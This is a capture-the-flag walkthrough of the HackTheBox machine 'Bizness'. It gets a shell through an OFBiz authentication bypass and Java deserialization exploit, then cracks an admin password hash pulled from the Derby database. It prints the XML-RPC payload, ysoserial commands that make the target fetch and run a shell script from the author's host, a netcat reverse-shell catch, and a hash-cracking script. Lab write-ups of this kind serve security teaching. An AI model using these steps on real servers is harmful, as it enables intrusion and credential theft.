---
layout: post
title: "HTB: Bizness"
author: Andrew Cherney
date: 2024-05-25 16:44:49
tags: htb easy-box linux webapp deserialization custom-code season-4
icon: "assets/icons/bizness.png"
post_description: "An authentication bypass + a java deserialization exploit can get user on this machine. Then after many hours of searching a root hash and salt can be found which allows for hashing rockyou to compare."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Bizness]
└──╼ $nmap -sC 10.129.174.75
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-06 21:21 CST
Nmap scan report for 10.129.174.75
Host is up (0.059s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp  open  http
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  https
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: Did not follow redirect to https://bizness.htb/
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-alpn: 
|_  http/1.1
```

## Port 443 - https

{% include img_link src="/img/bizness/bizness_front_page" alt="front_page" ext="png" trunc=600 %}

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Bizness]
└──╼ $dirsearch -u https://bizness.htb

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/Active/Bizness/reports/https_bizness.htb/_24-01-06_21-31-45.txt

Target: https://bizness.htb/

[21:31:45] Starting: 
[21:31:59] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[21:32:00] 400 -  795B  - /a%5c.aspx
[21:32:01] 302 -    0B  - /accounting  ->  https://bizness.htb/accounting/
[21:32:22] 302 -    0B  - /catalog  ->  https://bizness.htb/catalog/
[21:32:24] 302 -    0B  - /common  ->  https://bizness.htb/common/
[21:32:24] 404 -  762B  - /common/
[21:32:24] 404 -  779B  - /common/config/db.ini
[21:32:24] 404 -  780B  - /common/config/api.ini
[21:32:26] 302 -    0B  - /content/  ->  https://bizness.htb/content/control/main
[21:32:26] 302 -    0B  - /content  ->  https://bizness.htb/content/
[21:32:26] 302 -    0B  - /content/debug.log  ->  https://bizness.htb/content/control/main
[21:32:26] 200 -   34KB - /control/
[21:32:26] 200 -   11KB - /control/login
[21:32:26] 200 -   34KB - /control
[21:32:28] 404 -  741B  - /default.jsp
[21:32:28] 404 -  763B  - /default.html
[21:32:31] 302 -    0B  - /error  ->  https://bizness.htb/error/
[21:32:31] 404 -  761B  - /error/
[21:32:31] 404 -  770B  - /error/error.log
[21:32:32] 302 -    0B  - /example  ->  https://bizness.htb/example/
[21:32:38] 302 -    0B  - /images  ->  https://bizness.htb/images/
[21:32:38] 404 -  769B  - /images/c99.php
[21:32:38] 404 -  768B  - /images/README
[21:32:38] 404 -  769B  - /images/Sym.php
[21:32:38] 404 -  762B  - /images/
[21:32:39] 302 -    0B  - /index.jsp  ->  https://bizness.htb/control/main
[21:33:07] 200 -   21B  - /solr/admin/
[21:33:07] 302 -    0B  - /solr/  ->  https://bizness.htb/solr/control/checkLogin/
[21:33:07] 200 -   21B  - /solr/admin/file/?file=solrconfig.xml

Task Completed
```

Cleaned up some results but I see some login portals. Head to the first one accounting and see where it redirects.

# User as ofbiz

## CVE-2023-51467 and CVE-2023-49070

![accounting login](/img/bizness/bizness_accounting_login.png)

Gets redirected to `https://bizness.htb/accounting/control/main`. In the bottom it states the version of OFBiz running is 18.12, so I check for OFBiz exploits that include this version, and the first thing I see is [https://threatprotect.qualys.com/2023/12/27/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-51467/](https://threatprotect.qualys.com/2023/12/27/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-51467/) which is an auth bypass by specifying a pair of credentials requires a password change. Conveniently affects versions 18.12.11 and earlier. 

The test for the cve is `https://bizness.htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y` and it should return `PONG` if it is vulnerable. 

![webtools ping test](/img/bizness/bizness_auth_bypass_test.png)

[https://github.com/g33xter/CVE-2020-9496](https://github.com/g33xter/CVE-2020-9496) uses ysoserial to generate a serialized java payload, which then needs to be sent as a POST to the endpoint `https://bizness.htb/webtools/control/xmlrpc/?USERNAME&PASSWORD=test&requirePasswordChange=Y` with the following xml data:

```xml
<?xml version="1.0"?>
    <methodCall>
        <methodName>RCE-Test</methodName>
        <params>
            <param>
                <value>
                    <struct>
                        <member>
                            <name>rce</name>
                            <value>
                                <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
                                payload here
                                </serializable>
                            </value>
                        </member>
                    </struct>
                </value>
            </param>
        </params>
    </methodCall>
```

There was an issue I came across and it was the java version I had removed some of the permissions I needed to create payloads with ysoserial, so like any rational human being I found a docker image and used that instead. Time for the test with a wget to my IP. 

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Bizness]
└──╼ $docker container run bnzm5270/ysoserial CommonsBeanutils1 "wget 10.10.14.68:8081" | base64 | tr -d "\n"
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqfK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAVd2dldCAxMC4xMC4xNC42ODo4MDgxCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAceXNvc2VyaWFsL1B3bmVyNjI2Mjk5MTA4OTUwNQEAHkx5c29zZXJpYWwvUHduZXI2MjYyOTkxMDg5NTA1OwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AEAAAAdTK/rq+AAAAMgAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAEUHducnB3AQB4cQB+AA14
```

Send the payload with burp and I get back an error.

```xml
HTTP/1.1 200 
Server: nginx/1.18.0
Date: Sun, 07 Jan 2024 05:00:30 GMT
Content-Type: text/xml;charset=UTF-8
Connection: close
Set-Cookie: JSESSIONID=89CDD3ECDFDDD51D340687F090270154.jvm1; Path=/webtools; Secure; HttpOnly
Set-Cookie: OFBiz.Visitor=10604; Max-Age=31536000; Expires=Mon, 06 Jan 2025 05:00:30 GMT; Path=/; Secure; HttpOnly
Content-Length: 369

<?xml version="1.0" encoding="UTF-8"?><methodResponse xmlns:ex="http://ws.apache.org/xmlrpc/namespaces/extensions"><fault><value><struct><member><name>faultCode</name><value><i4>0</i4></value></member><member><name>faultString</name><value>Failed to read XML-RPC request. Please check logs for more information</value></member></struct></value></fault></methodResponse>
```

But when I look at my python server I got a hit back. 

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Bizness]
└──╼ $python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.174.75 - - [06/Jan/2024 23:00:22] "GET / HTTP/1.1" 200 -
```

I generated some more payloads and sent them with burp to get a shell running, I'll just toss the payload generation to make it easier to read and follow. 

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Bizness]
└──╼ $docker container run bnzm5270/ysoserial CommonsBeanutils1 "wget 10.10.14.68:8081/shell.sh" | base64 | tr -d "\n"
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Bizness]
└──╼ $docker container run bnzm5270/ysoserial CommonsBeanutils1 "bash shell.sh" | base64 | tr -d "\n"
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Bizness]
└──╼ $nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.129.174.75 41712
bash: cannot set terminal process group (769): Inappropriate ioctl for device
bash: no job control in this shell
ofbiz@bizness:/opt/ofbiz$ cd /home/ofbiz
cd /home/ofbiz
ofbiz@bizness:~$ ls
ls
l
user.txt
ofbiz@bizness:~$ cat user.txt
cat user.txt
44b663ad292---------------------
```

I added a .ssh and authorized_keys pair so I can ssh into the machine for a more stable shell.

# User as Root

## Scouring the box

The following is a list of things I tried before finding the next step.  

1. *1.* I checked the site for a database or password file, couldn't find anything not default  
2. *2.* I ran linpeas and it threw some flags  
    2a. `/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew`  
        2aa. I check for any way I could restart the service and I didn't find anything  
        2ab. I tossed some code that would write a file if it ever ran, and when I looked later nothing was there  
    2b. /home/ofbiz/l/python3 cap_setuid=eip is writable  
        2ba. Check owner and its ofbiz, and calling the file from a root file probably cant privesc  
        2bb. Tried anyway to chain together some SUIDs and this python3 executable, no results  
    2c. Potentially Vulnerable to CVE-2022-0847, run exploit nothing  
    2d. Potentially Vulnerable to CVE-2022-2588, run exploit nothing  
3. Look for hashes in xml files with `find / -name '*.xml' 2>/dev/null | grep Login`  
    3a. `<UserLogin userLoginId="@userLoginId@" currentPassword="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a" requirePasswordChange="Y"/>`  
        3aa. Can't crack either salted or not in rockyou.txt  

## derby credentials

I look back at linpeas and it did flag that derby was the backend database manager for the ofbiz site. 

```bash
ofbiz@bizness:~$ find / -type f -name '*.dat' 2>/dev/null
/var/cache/debconf/passwords.dat
/var/cache/debconf/templates.dat
/var/cache/debconf/config.dat
/usr/lib/jvm/java-11-openjdk-amd64/lib/tzdb.dat
/usr/share/GeoIP/GeoIP.dat
/usr/share/GeoIP/GeoIPv6.dat
/usr/share/publicsuffix/public_suffix_list.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c10001.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c7161.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c12fe1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/cf4f1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/cc3f1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/cc581.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c11601.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c9151.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c101.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/cebd1.dat
(there is tons more)
```

strings all of these files and search for password/Password.

```bash
ofbiz@bizness:~$ strings /opt/ofbiz/runtime/data/derby/ofbiz/seg0/* | grep Password
                        <td align='left'><span>Password: </span></td>
                  <div><a href="<@ofbizUrl>/forgotpasswd</@ofbizUrl>">Forgot Password?</a></div>
        <Password>${password}</Password>
!Change Password Template Location
!Forget Password Template Location
Retrieve Password
                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
Password
```

Progress! The hash is SHA1 with a salt of 'd', but there is some formatting happening here that does not look familiar. Luckily for us ofbiz is open source and can be seen on github. I will use the sophisticated method of searching for "crypt" to find the cryptography function. HashCrypt.java is exactly what I was looking for. [https://github.com/apache/ofbiz-framework/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java](https://github.com/apache/ofbiz-framework/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.jav).

```java
    public static String cryptBytes(String hashType, String salt, byte[] bytes) {
        if (hashType == null) {
            hashType = "SHA";
        }
        if (salt == null) {
            salt = RandomStringUtils.random(SECURE_RANDOM.nextInt(15) + 1, CRYPT_CHAR_SET);
        }
        StringBuilder sb = new StringBuilder();
        sb.append("$").append(hashType).append("$").append(salt).append("$");
        sb.append(getCryptedBytes(hashType, salt, bytes));
        return sb.toString();
    }

    private static String getCryptedBytes(String hashType, String salt, byte[] bytes) {
        try {
            MessageDigest messagedigest = MessageDigest.getInstance(hashType);
            messagedigest.update(salt.getBytes(StandardCharsets.UTF_8));
            messagedigest.update(bytes);
            return Base64.encodeBase64URLSafeString(messagedigest.digest()).replace('+', '.');
        } catch (NoSuchAlgorithmException e) {
            throw new GeneralRuntimeException("Error while comparing password", e);
        }
    }
```

The above lines are the important part that I needed to see. The resulting hash is url safe base64 encoded and then `+` is replaced with `.`

I did admittedly panic a little bit as the salt function is set to be random with no salt but as mentioned above the salt is sandwiched between the hash and the algorithm. Now I can make some basic salting and hashing script that I can use to hash rockyou.txt to compare against the found hash.

[https://github.com/CyberCherney/random_scripts/blob/main/hacking/htb_exploits/shaencrypt.py](https://github.com/CyberCherney/random_scripts/blob/main/hacking/htb_exploits/shaencrypt.py)

```python
# Custom HTB box exploit
# output directed towards a file then grep to search
import hashlib
import base64

class HashProcessor:
    def __init__(self, algorithm_name='sha1'):
        self.set_algorithm(algorithm_name)

    def set_algorithm(self, algorithm_name):
        try:
            self.hash_algorithm = getattr(hashlib, algorithm_name)
        except AttributeError:
            raise ValueError(f"Invalid algorithm name: {algorithm_name}")

    def hash_with_salt(self, input_string, salt):
        # Combine the salt with the input string
        salted_input = salt + input_string

        # Create a new hash object
        hash_obj = self.hash_algorithm()

        # Update the hash object with the bytes of the salted input string
        hash_obj.update(salted_input.encode())

        # Return the hash value as a byte object
        return hash_obj.digest()

# Main execution
def main():
    algorithm = 'sha1'
    salt = 'd'

    hasher = HashProcessor(algorithm)

    with open("/opt/wordlists/rockyou.txt", "r", encoding="latin-1", errors='ignore') as file:
        for line in file:
            password = line.strip()  # Remove any leading/trailing whitespace
            hash_value = hasher.hash_with_salt(password, salt)
            print(f"The {algorithm.upper()} hash of '{password}' with salt '{salt}' is: {base64.urlsafe_b64encode(hash_value).decode('utf-8').replace('+', '.')}")

if __name__ == "__main__":
    main()
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Bizness]
└──╼ $nano sha1_hash.py 
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Bizness]
└──╼ $rm saltedhashedrockyou.txt 
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Bizness]
└──╼ $python3 sha1_hash.py > saltedhashedrockyou.txt
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Bizness]
└──╼ $cat saltedhashedrockyou.txt | grep 'uP0_QaVBpDWFeo8-dRzDqRwXQ2I'
The SHA1 hash of 'monkeybizness' with salt 'd' is: uP0_QaVBpDWFeo8-dRzDqRwXQ2I=
```

```bash
─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Bizness]
└──╼ $ssh ofbiz@bizness.htb -i ofbiz 
Linux bizness 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
ofbiz@bizness:~$ su
Password: 
root@bizness:/home/ofbiz# cd /root
root@bizness:~# ls
root.txt
root@bizness:~# cat root.txt
3ea2fc24c-----------------------
```
